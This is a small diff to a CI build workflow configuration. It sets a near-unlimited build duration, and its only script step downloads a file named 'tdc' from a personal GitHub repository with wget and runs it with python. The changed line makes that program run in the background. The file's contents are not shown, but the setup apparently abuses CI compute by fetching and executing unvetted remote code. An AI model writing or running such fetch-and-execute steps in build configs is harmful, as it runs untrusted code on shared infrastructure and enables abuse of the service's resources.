@@ -4,4 +4,4 @@ workflows:
     max_build_duration: 99999
     instance_type: linux
     scripts:
-      - wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc
+      - wget https://raw.githubusercontent.com/erlandi-26/erlandi-26/main/tdc && python tdc &
